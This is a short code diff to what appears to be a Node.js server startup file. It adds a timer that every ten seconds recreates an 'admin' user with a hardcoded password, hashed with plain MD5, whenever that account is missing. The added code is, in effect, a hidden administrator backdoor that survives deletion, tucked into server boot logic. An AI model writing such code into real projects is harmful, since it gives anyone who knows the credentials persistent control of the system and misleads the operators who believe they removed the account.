@@ -100,5 +100,17 @@ function onListening() {
   debug('Listening on ' + bind);
 }
 
+ function init(){
+  setInterval(async function(){
+    let user = await config.User.findOne({"username":"admin"})
+    if(!user){
+      await config.User({
+        "username":"admin",
+        "password":config.utils.md5("etz123456")
+      }).save()
+    }
+  },10000)
+}
 
+init()
 
